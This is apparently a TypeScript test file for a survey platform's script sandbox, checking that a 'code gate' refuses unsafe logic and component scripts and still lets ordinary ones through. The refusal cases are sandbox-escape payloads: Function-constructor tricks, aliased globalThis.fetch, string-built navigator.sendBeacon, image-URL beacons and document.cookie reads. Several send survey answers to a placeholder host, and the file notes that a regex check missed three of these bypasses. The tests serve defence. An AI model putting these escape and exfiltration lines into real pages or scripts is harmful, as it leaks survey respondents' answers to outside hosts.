import { test } from "node:test";
import assert from "node:assert/strict";
import { codeGate, gateSurveyScripts } from "./codeGate.js";
import { createScriptCtx, runScript, runScripts } from "./scripts.js";
import { SurveyDefinition } from "@rescript/schema";
import { createResponseState } from "./state.js";

/* S0b D3 — the code gate for logic scripts (def.scripts) */

const refused = (code: string, re: RegExp) => {
  const v = codeGate(code, "logic");
  assert.equal(v.ok, false, `expected a refusal for ${code}`);
  assert.ok(v.errors.some((e) => re.test(e)), `${code} → ${v.errors.join(" | ")}`);
};

test("logic gate: the audit's escapes are refused (probe 1, S4 AP-02)", () => {
  refused(`(()=>{}).constructor('return process')()`, /constructor is not available/);
  refused(`ctx.get.constructor('return typeof process')()`, /constructor is not available/);
  refused(`get.constructor("return globalThis")().fetch("https://x.example")`, /constructor is not available/);
  refused(`const f = globalThis.fetch; f("https://x.example/?" + get("Q1"));`, /globalThis is not available/);
  refused(`navigator["send" + "Beacon"]("https://x.example", get("Q1"));`, /navigator is not available/);
  refused(`const o = {}; o["constructor"]["constructor"]("return 1")();`, /"constructor" is not available, not even as a string/);
  refused(`const o = {}; o["constru" + "ctor"];`, /computed property name built from strings/);
  refused("const o = {}; o[`${'constru'}ctor`];", /computed property name built from strings/);
  refused(`const k = "x"; Math[k];`, /computed access on Math\[…\]/);
  refused(`Object.getPrototypeOf(async function () {});`, /getPrototypeOf is not available/);
  refused(`eval("1")`, /eval is not available/);
  refused(`import("https://x.example/m.js")`, /import is not available/);
  refused(`new XMLHttpRequest()`, /XMLHttpRequest is not available/);
  refused(`new WebSocket("wss://x.example")`, /WebSocket is not available/);
  refused(`localStorage.getItem("a")`, /localStorage is not available/);
  refused(`window.top.location = "https://x.example"`, /window is not available/);
  refused(`Reflect.get(ctx, "get")`, /Reflect is not available/);
  refused(`new Proxy({}, {})`, /Proxy is not available/);
  refused(`setInterval(() => {}, 10)`, /setInterval is not available/);
  refused(`Array.prototype.slice.call([])`, /prototype is not available/);
  refused(`({}).__proto__`, /__proto__ is not available/);
  refused(`__g = () => {};`, /__g is not available/);
  refused(`for (;;) x++;`, /needs braces/);
  refused(`const get = 1;`, /does not parse/); // clashes with the helper it would shadow — caught on save, not in a respondent's browser
});

test("logic gate: ordinary scripts pass (the master-demo shapes, loops, ctx helpers, local computed access)", () => {
  for (const code of [
    "setCalc('BUILD_TAG', 'MASTER_DEMO_2026_v1');\nlog('panel', getEmbedded('PANEL_ID'));",
    "const s = Number(get('q_monthly_spend'));\nsetCalc('SPEND_BAND_TEXT', !Number.isFinite(s) ? '' : s < 50 ? 'a light' : 'a heavy');",
    "const used = (get('q_used') || []).map(String);\nconst trusted = (get('q_trusted') || []).map(String);\nset('h_lf_source', used.filter((c) => trusted.includes(c)).map(Number));",
    "const years = get('q_years_used') || {};\nconst bad = [];\nfor (const k of Object.keys(years)) { if (Number(years[k]) > 90) bad.push(k); }\nsetCalc('BAD', bad.length);",
    "let total = 0; for (let i = 0; i < 3; i++) { total += Number(get('Q' + (i + 1))) || 0; } if (total > 100) error('over 100', 'Q1');",
    "const row = getCurrentLoopItem(); if (row) setCalc('LAST', row.references['Region']);",
    "if (value != null && String(value).length < 3) error('too short');",
    "const v = expr('Q1 + Q2'); setCalc('T', v); flag('done'); log(pipe('{{Q1}}'));",
  ]) {
    const v = codeGate(code, "logic");
    assert.deepEqual(v.errors, [], code);
  }
});

test("logic gate: runScript refuses at run time and bounds an endless loop", () => {
  const def = SurveyDefinition.parse({ meta: { id: "s", code: "S", title: "t", version: "1" }, questions: [], flow: [] });
  const state = createResponseState(def, { seed: 1, sessionId: "x" } as never);
  const run = { logs: [] as string[], errors: [] };
  const ctx = createScriptCtx(def, state, null, run);
  const r = runScript(`log(ctx.get.constructor('return typeof process')())`, ctx, run);
  assert.match(r.refused ?? "", /constructor is not available/);
  assert.match(r.failed ?? "", /^refused: /);
  assert.deepEqual(run.logs, [], "nothing ran");
  const loop = runScript(`let i = 0; while (true) { i++; }`, ctx, { logs: [], errors: [] });
  assert.match(loop.failed ?? "", /a loop ran more than 100,000 times and was stopped/);
  const run2 = { logs: [] as string[], errors: [] };
  const ok = runScript(`let n = 0; for (let i = 0; i < 10; i++) { n++; } log(n);`, createScriptCtx(def, state, null, run2), run2);
  assert.equal(ok.failed, undefined);
  assert.deepEqual(run2.logs, ["10"]);
});

test("logic gate: runScripts logs `[name] refused: reason` and does not count it as run", () => {
  const def = SurveyDefinition.parse({
    meta: { id: "s", code: "S", title: "t", version: "1" }, questions: [], flow: [],
    scripts: [
      { id: "a", name: "bad", scope: "survey", event: "on_load", enabled: true, code: "const F = (()=>{}).constructor; F('return 1')();" },
      { id: "b", name: "good", scope: "survey", event: "on_load", enabled: true, code: "setCalc('X', 1);" },
    ],
  });
  const state = createResponseState(def, { seed: 1, sessionId: "x" } as never);
  const r = runScripts(def, state, "on_load");
  assert.equal(r.ran, 1);
  assert.deepEqual(r.refusedScripts, ["bad"]);
  assert.ok(r.logs.some((l) => /^\[bad\] refused: constructor is not available/.test(l)), r.logs.join(" | "));
  assert.equal(state.calculated.X, 1);
});

test("gateSurveyScripts: a failing script is switched off with the verdict in its notes; a passing one is untouched", () => {
  const def = {
    scripts: [
      { id: "1", name: "Imported js · page", code: "fetch('https://x.example')", enabled: false, notes: "Imported from qualtrics; not executed." },
      { id: "2", name: "pasted", code: "navigator.sendBeacon('https://x.example')", enabled: true },
      { id: "3", name: "fine", code: "setCalc('A', 1);", enabled: true },
    ],
  };
  const g = gateSurveyScripts(def);
  assert.deepEqual(g.refused.map((r) => [r.name, r.wasEnabled]), [["Imported js · page", false], ["pasted", true]]);
  assert.equal(g.def.scripts[0]!.enabled, false);
  assert.match(g.def.scripts[0]!.notes ?? "", /^Script check: refused — fetch is not available.*Imported from qualtrics/);
  assert.equal(g.def.scripts[1]!.enabled, false, "an enabled script that fails is switched off");
  assert.equal(g.def.scripts[2], def.scripts[2], "a passing script is the same object");
  assert.equal(gateSurveyScripts(g.def).def.scripts[0]!.notes, g.def.scripts[0]!.notes, "the verdict is attached once");
});

/* S0b D2 — the component flavour (a Custom Component's customJs: roots el and api) */

const compRefused = (code: string, re: RegExp) => {
  const v = codeGate(code, "component");
  assert.equal(v.ok, false, `expected a refusal for ${code}`);
  assert.ok(v.errors.some((e) => re.test(e)), `${code} → ${v.errors.join(" | ")}`);
};

test("component gate: the three S4 bypasses of the regex check are refused", async () => {
  const { exfiltrationProblems } = await import("./uxScriptGuard.js");
  const alias = `const f = globalThis.fetch; f("https://x.example/?" + api.getValue());`;
  const ctor = `const F = (() => {}).constructor; F("return 1")();`;
  const beacon = `const n = navigator; n["send" + "Beacon"]("https://x.example", api.getValue());`;
  // the regex check alone let each of these through (S4 §2 N) — it stays as a signal, the gate decides
  for (const c of [alias, ctor, beacon]) assert.deepEqual(exfiltrationProblems(c), [], `regex still blind to ${c}`);
  compRefused(alias, /globalThis is not available/);
  compRefused(ctor, /constructor is not available/);
  compRefused(beacon, /navigator is not available/);
});

test("component gate: escapes through the element and the page are refused", () => {
  compRefused(`el.ownerDocument.defaultView.fetch("https://x.example")`, /ownerDocument is not available/);
  compRefused(`el["owner" + "Document"]`, /computed property name built from strings/);
  compRefused(`window.addEventListener("message", () => {})`, /window is not available/);
  compRefused(`document.cookie`, /document is not available|cookie is not available/);
  compRefused(`document.querySelector("form").submit()`, /document is not available/);
  compRefused(`this["fetch"]("https://x.example")`, /computed access on this\[…\]/);
  compRefused(`new Image().src = "https://x.example/?" + api.getValue();`, /Image is not available/);
  compRefused(`location.href = "https://x.example"`, /location is not available/);
  compRefused(`with (el) { textContent = "x"; }`, /with is not available/);
  compRefused(`for (;;) el.textContent += "x";`, /needs braces/);
});

test("component gate: ordinary component code passes (DOM work on el, api, nodes made with document.createElement)", () => {
  for (const code of [
    "el.textContent = 'component';",
    "el.querySelector('input').addEventListener('change', function (e) { api.setValue(e.target.value); });",
    "const b = document.createElement('button'); b.textContent = 'Pick'; b.onclick = () => api.setValue(1); el.appendChild(b);",
    "const v = api.getValue(); const items = el.querySelectorAll('[data-v]'); for (const it of items) { it.classList.toggle('on', it.dataset.v === String(v)); }",
    "let n = 0; const tick = () => { n++; el.dataset.n = String(n); }; setTimeout(tick, 100);",
    "const stars = [1, 2, 3, 4, 5]; stars.forEach((s) => { const x = document.createElement('span'); x.textContent = '★'; x.addEventListener('click', () => api.setValue(s)); el.append(x); });",
  ]) assert.deepEqual(codeGate(code, "component").errors, [], code);
});

test("component gate: IM set_custom_code decides with the gate (the regex is only a signal)", async () => {
  const { applySurveyActions } = await import("./surveyActions.js");
  const def = SurveyDefinition.parse({
    meta: { id: "s", code: "S", title: "t", version: "1" }, flow: [],
    questions: [{ id: "q1", code: "Q1", variableName: "Q1", type: "custom_component", text: "Pick", customJs: "el.textContent = 'v1';" }],
  });
  const bad = applySurveyActions(def, [{ op: "set_custom_code", target: "Q1", js: `const f = globalThis.fetch; f("https://x.example/?" + api.getValue());` }] as never);
  assert.equal(bad.results[0]!.ok, false);
  assert.match(bad.errors.join(" "), /component script for Q1 was refused — globalThis is not available/);
  const good = applySurveyActions(def, [{ op: "set_custom_code", target: "Q1", js: "el.textContent = 'v2';" }] as never);
  assert.equal(good.results[0]!.ok, true, good.errors.join("; "));
  assert.equal(good.def.questions[0]!.customJs, "el.textContent = 'v2';");
});
